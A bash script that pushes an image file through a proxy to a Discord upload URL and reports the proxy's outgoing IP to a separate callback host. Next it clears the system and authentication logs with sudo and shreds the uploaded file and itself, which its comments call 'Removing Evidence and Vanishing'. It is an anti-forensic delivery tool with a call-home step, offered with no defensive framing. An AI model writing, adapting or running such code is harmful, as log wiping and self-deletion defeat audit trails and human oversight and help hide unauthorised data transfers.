#!/bin/bash

# Configuration
PROXY="http://10.108.0.2:3128"  # Your Squid proxy
DESTINATION="http://discord.com/upload"  # Where to deliver the goods
PAYLOAD="/mnt/d/trouble/qntine/pics/anna.jpg"  # The file to deliver
CALLBACK_URL="http://whispr.dev/report"  # Where to report success
CALLBACK_MESSAGE="Delibery Completeful. From SQ: "

# Step 1: Deliver the payload through the proxy
echo "Delivering treats to $DESTINATION..."
curl --proxy "$PROXY" --upload-file "$PAYLOAD" "$DESTINATION" -s -o /dev/null
if [ $? -eq 0 ]; then
    echo "Treats delibered successfully!"
else
    echo "Delibery failiured!"
    exit 1
fi

# Step 2: Get the outgoing IP (to confirm which IP was used)
IP=$(curl --proxy "$PROXY" http://httpbin.org/ip -s | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -n 1)
echo "Used IP: $IP"

# Step 3: Call home with the IP used
curl --proxy "$PROXY" -X POST -d "$CALLBACK_MESSAGE$IP" "$CALLBACK_URL" -s -o /dev/null
if [ $? -eq 0 ]; then
    echo "Called home to $CALLBACK_URL!"
else
    echo "Call home failiured!"
    exit 1
fi
# Clear system logs
sudo truncate -s 0 /var/log/syslog 2>/dev/null || true
sudo truncate -s 0 /var/log/messages 2>/dev/null || true
sudo truncate -s 0 /var/log/auth.log 2>/dev/null || true
# Step 4: Clean up and self-destruct
echo "Removing Evidence and Vanishing..."
shred -u "$PAYLOAD" 2>/dev/null || rm -f "$PAYLOAD"  # Delete the payload file
shred -u "$0" 2>/dev/null || rm -f "$0"  # Self-destruct the script
echo "Poof! Gone with but a trace."
exit 0
